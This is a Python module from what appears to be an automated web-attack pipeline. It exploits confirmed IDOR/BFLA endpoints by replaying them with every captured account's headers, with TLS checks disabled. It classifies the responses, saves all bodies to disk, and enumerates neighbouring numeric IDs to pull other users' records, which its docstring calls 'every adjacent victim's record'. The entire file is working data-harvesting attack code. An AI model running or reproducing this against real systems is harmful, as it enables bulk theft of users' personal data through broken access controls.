"""
data_extractor.py — Walk confirmed IDOR/BFLA endpoints with each available
account, classify per-user vs site-wide resources, and pull the data.

Why this exists: IDORProbe confirms a cross-account read worked. But it does
NOT save the actual data, and it doesn't tell us whether the affected resource
is *unique per user* (genuinely sensitive — orders, profiles, baskets) or
*site-wide* (everyone sees the same shared content — products, blog posts,
public reviews).

This module:
  1. Takes IDOR findings (confirmed + likely).
  2. For each endpoint, fetches it with EVERY account headers we have.
  3. Compares the responses:
     - Identical bodies across all accounts → "shared" / site-wide
     - Differs by account → "per_user"
  4. Saves all responses to disk:
     - per_user/<sanitized-endpoint>/<account-label>.json
     - shared/<sanitized-endpoint>.json (one copy)
  5. Probes object-ID iteration for numeric/UUID paths (e.g.
     /rest/basket/1, /rest/basket/2, …) to enumerate victim records.

Pipeline position: after IDORProbe + after enrichment, before report. Only
runs when at least one account has headers.
"""

import asyncio
import hashlib
import json
import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse, urlunparse

import httpx


_NUMERIC_ID_RE = re.compile(r"/(\d{1,6})(/|$)")
_UUID_RE = re.compile(r"/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(/|$)", re.I)
# Iterate this many neighbouring IDs around the original
_ID_ITERATION_SPAN = 8
# Per-endpoint cap on stored response bytes
_MAX_BODY_BYTES = 200 * 1024
# Total endpoints walked
_MAX_ENDPOINTS = 50


@dataclass
class AccountTokens:
    """Lightweight wrapper around an account's auth headers."""
    label: str
    headers: dict
    username: str = ""
    email: str = ""


@dataclass
class ExtractedRecord:
    endpoint: str
    method: str
    account_label: str
    status: int
    body_path: str
    body_sha256: str
    bytes_saved: int


@dataclass
class EndpointSummary:
    endpoint: str
    method: str
    kind: str                     # "confirmed_idor" | "per_user" | "public" | "auth_required" | "error_response"
    accounts_used: int
    distinct_bodies: int
    saved_to: str
    anon_status: Optional[int] = None
    a_status: Optional[int] = None
    b_status: Optional[int] = None
    iterations: int = 0
    notes: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "endpoint": self.endpoint, "method": self.method,
            "kind": self.kind, "accounts_used": self.accounts_used,
            "distinct_bodies": self.distinct_bodies,
            "saved_to": self.saved_to,
            "anon_status": self.anon_status,
            "a_status": self.a_status,
            "b_status": self.b_status,
            "iterations": self.iterations,
            "notes": self.notes,
        }


@dataclass
class DataExtractResult:
    records_pulled: int = 0
    confirmed_idor_endpoints: int = 0
    per_user_endpoints: int = 0
    shared_endpoints: int = 0       # alias of public_endpoints (kept for backward compat)
    public_endpoints: int = 0
    auth_required_endpoints: int = 0
    error_endpoints: int = 0
    records: list[ExtractedRecord] = field(default_factory=list)
    endpoint_summaries: list = field(default_factory=list)
    out_dir: str = ""

    def to_dict(self) -> dict:
        return {
            "records_pulled": self.records_pulled,
            "confirmed_idor_endpoints": self.confirmed_idor_endpoints,
            "per_user_endpoints": self.per_user_endpoints,
            "public_endpoints": self.public_endpoints,
            "auth_required_endpoints": self.auth_required_endpoints,
            "error_endpoints": self.error_endpoints,
            "shared_endpoints": self.shared_endpoints,  # legacy alias
            "out_dir": self.out_dir,
            "endpoints": self.endpoint_summaries,
        }


class DataExtractor:
    def __init__(self, out_dir: str, timeout: float = 8.0):
        self.out_root = Path(out_dir) / "idor_pull"
        self.timeout = timeout

    async def run(self, idor_result, accounts: list[AccountTokens]) -> DataExtractResult:
        result = DataExtractResult(out_dir=str(self.out_root))
        if not accounts:
            return result

        # Build the endpoint list. Dedupe by (method, normalized URL).
        targets: list[tuple[str, str]] = []
        seen: set[str] = set()
        for f in (idor_result.confirmed + idor_result.likely)[:_MAX_ENDPOINTS]:
            key = f"{f.method} {f.url}"
            if key in seen:
                continue
            seen.add(key)
            targets.append((f.method, f.url))
        if not targets:
            return result

        self.out_root.mkdir(parents=True, exist_ok=True)
        async with httpx.AsyncClient(
            verify=False, follow_redirects=True, timeout=self.timeout,
        ) as client:
            for method, url in targets:
                summary = await self._extract_endpoint(client, method, url, accounts, result)
                result.endpoint_summaries.append(summary.to_dict())
                if summary.kind == "confirmed_idor":
                    result.confirmed_idor_endpoints += 1
                elif summary.kind == "per_user":
                    result.per_user_endpoints += 1
                elif summary.kind == "public":
                    result.public_endpoints += 1
                    result.shared_endpoints += 1  # legacy alias
                elif summary.kind == "auth_required":
                    result.auth_required_endpoints += 1
                else:
                    result.error_endpoints += 1

        (self.out_root / "summary.json").write_text(json.dumps(result.to_dict(), indent=2))
        return result

    async def _extract_endpoint(self, client: httpx.AsyncClient, method: str,
                                url: str, accounts: list[AccountTokens],
                                result: DataExtractResult) -> EndpointSummary:
        method_to_use = method if method in ("GET", "HEAD") else "GET"

        # Anon baseline — fetch with NO auth headers. Tells us whether this
        # endpoint is access-controlled or genuinely public.
        try:
            r_anon = await client.request(method_to_use, url, headers={})
            anon_status = r_anon.status_code
        except Exception:
            r_anon = None
            anon_status = None

        # Per-account fetches
        responses: dict[str, httpx.Response] = {}
        for acc in accounts:
            try:
                responses[acc.label] = await client.request(
                    method_to_use, url, headers=acc.headers,
                )
            except Exception:
                continue

        if not responses:
            return EndpointSummary(
                endpoint=url, method=method, kind="error_response",
                accounts_used=0, distinct_bodies=0, saved_to="",
                anon_status=anon_status,
                notes=["all account fetches failed"],
            )

        first_label, first_r = next(iter(responses.items()))
        a_status = responses[accounts[0].label].status_code if accounts[0].label in responses else None
        b_status = (responses[accounts[1].label].status_code
                    if len(accounts) > 1 and accounts[1].label in responses else None)

        # Status-code gate — 5xx is server error, not classifiable content.
        # 4xx across the board means access-controlled and our auth was wrong.
        if all(r.status_code >= 500 for r in responses.values()):
            folder = self.out_root / "errors"
            folder.mkdir(parents=True, exist_ok=True)
            body_path = folder / f"{self._sanitize(url)}.txt"
            try:
                body_path.write_bytes(first_r.content[:_MAX_BODY_BYTES])
            except Exception:
                pass
            return EndpointSummary(
                endpoint=url, method=method, kind="error_response",
                accounts_used=len(responses), distinct_bodies=0,
                saved_to=str(body_path),
                anon_status=anon_status, a_status=a_status, b_status=b_status,
                notes=[f"all responses 5xx — {first_r.status_code}"],
            )
        if all(r.status_code >= 400 for r in responses.values()):
            return EndpointSummary(
                endpoint=url, method=method, kind="auth_required",
                accounts_used=len(responses), distinct_bodies=0,
                saved_to="",
                anon_status=anon_status, a_status=a_status, b_status=b_status,
                notes=["all accounts blocked — endpoint correctly access-controlled"],
            )

        # Hash bodies for per-user vs identical comparison (only consider 2xx)
        ok_responses = {l: r for l, r in responses.items() if 200 <= r.status_code < 300}
        body_hashes: dict[str, str] = {
            l: hashlib.sha256(r.content[:_MAX_BODY_BYTES]).hexdigest()
            for l, r in ok_responses.items()
        }
        distinct = len(set(body_hashes.values()))

        # Decision matrix using anon baseline:
        # - anon 2xx + identical to A → public (genuinely shared)
        # - anon 4xx + A 2xx + bodies identical across accounts → confirmed_idor
        # - anon 4xx + A 2xx + bodies differ → per_user (each sees own data)
        anon_blocked = anon_status is not None and 400 <= anon_status < 500
        anon_ok = anon_status is not None and 200 <= anon_status < 300
        anon_body_hash = (hashlib.sha256(r_anon.content[:_MAX_BODY_BYTES]).hexdigest()
                          if anon_ok and r_anon is not None else None)

        if not ok_responses:
            return EndpointSummary(
                endpoint=url, method=method, kind="auth_required",
                accounts_used=len(responses), distinct_bodies=0,
                saved_to="",
                anon_status=anon_status, a_status=a_status, b_status=b_status,
            )

        if anon_blocked and distinct == 1 and len(ok_responses) >= 2:
            # Auth-required endpoint where every account sees the same body.
            # That body is whoever-owns-the-resource's data — reading it from
            # multiple accounts means at least one of them is bypassing auth.
            kind = "confirmed_idor"
        elif anon_ok and anon_body_hash and anon_body_hash in body_hashes.values() and distinct == 1:
            kind = "public"
        elif distinct > 1:
            kind = "per_user"
        else:
            # Same body across accounts, anon is also OK (or unknown) — public
            kind = "public"

        endpoint_slug = self._sanitize(url)
        bucket = {
            "confirmed_idor": "confirmed_idor",
            "per_user": "per_user",
            "public": "public",
        }.get(kind, "errors")
        if kind == "per_user" or kind == "confirmed_idor":
            folder = self.out_root / bucket / endpoint_slug
            folder.mkdir(parents=True, exist_ok=True)
            saved_to = str(folder)
            # Save each account body PLUS anon for direct comparison
            for label, r in responses.items():
                body = r.content[:_MAX_BODY_BYTES]
                (folder / f"{label}.json").write_bytes(body)
                result.records.append(ExtractedRecord(
                    endpoint=url, method=method, account_label=label,
                    status=r.status_code,
                    body_path=str(folder / f"{label}.json"),
                    body_sha256=hashlib.sha256(body).hexdigest(),
                    bytes_saved=len(body),
                ))
                result.records_pulled += 1
            if r_anon is not None:
                anon_body = r_anon.content[:_MAX_BODY_BYTES]
                (folder / "anon.json").write_bytes(anon_body)
        else:
            folder = self.out_root / bucket
            folder.mkdir(parents=True, exist_ok=True)
            body_path = folder / f"{endpoint_slug}.json"
            saved_to = str(body_path)
            body = first_r.content[:_MAX_BODY_BYTES]
            body_path.write_bytes(body)
            result.records.append(ExtractedRecord(
                endpoint=url, method=method, account_label=first_label,
                status=first_r.status_code, body_path=str(body_path),
                body_sha256=hashlib.sha256(body).hexdigest(),
                bytes_saved=len(body),
            ))
            result.records_pulled += 1

        # ID iteration only for per_user / confirmed_idor (numeric paths)
        iterations = 0
        if kind in ("per_user", "confirmed_idor"):
            iterations = await self._iterate_ids(client, method, url, accounts, result)

        return EndpointSummary(
            endpoint=url, method=method, kind=kind,
            accounts_used=len(responses),
            distinct_bodies=distinct,
            saved_to=saved_to,
            anon_status=anon_status, a_status=a_status, b_status=b_status,
            iterations=iterations,
        )

    async def _iterate_ids(self, client: httpx.AsyncClient, method: str,
                           url: str, accounts: list[AccountTokens],
                           result: DataExtractResult) -> int:
        """For per-user endpoints with an ID in the path, walk neighbouring
        IDs to pull every adjacent victim's record using the most permissive
        account."""
        # Pick the strongest account — first one with a token wins
        acc = accounts[0]
        for a in accounts:
            if any(k.lower() == "authorization" for k in a.headers):
                acc = a
                break

        match = _NUMERIC_ID_RE.search(url)
        if match:
            base_id = int(match.group(1))
            ids = [str(i) for i in range(max(1, base_id - _ID_ITERATION_SPAN),
                                         base_id + _ID_ITERATION_SPAN + 1)]
            replace_re = _NUMERIC_ID_RE
        else:
            return 0  # Skip UUID iteration — too sparse to brute force

        folder = self.out_root / "id_iteration" / self._sanitize(url)
        folder.mkdir(parents=True, exist_ok=True)
        saved = 0
        for new_id in ids:
            new_url = replace_re.sub(f"/{new_id}\\2", url, count=1)
            if new_url == url:
                continue
            try:
                r = await client.request(
                    method if method in ("GET", "HEAD") else "GET",
                    new_url, headers=acc.headers,
                )
            except Exception:
                continue
            if r.status_code not in (200, 201, 206):
                continue
            body = r.content[:_MAX_BODY_BYTES]
            if not body:
                continue
            (folder / f"id_{new_id}.json").write_bytes(body)
            result.records.append(ExtractedRecord(
                endpoint=new_url, method=method, account_label=acc.label,
                status=r.status_code,
                body_path=str(folder / f"id_{new_id}.json"),
                body_sha256=hashlib.sha256(body).hexdigest(),
                bytes_saved=len(body),
            ))
            result.records_pulled += 1
            saved += 1
        return saved

    @staticmethod
    def _sanitize(url: str, max_len: int = 100) -> str:
        parsed = urlparse(url)
        slug = (parsed.path + ("?" + parsed.query if parsed.query else "")).strip("/") or "root"
        clean = re.sub(r"[^A-Za-z0-9._-]+", "_", slug).strip("_") or "endpoint"
        if len(clean) > max_len:
            tail = hashlib.sha256(url.encode()).hexdigest()[:8]
            clean = clean[:max_len - 9] + "_" + tail
        return clean
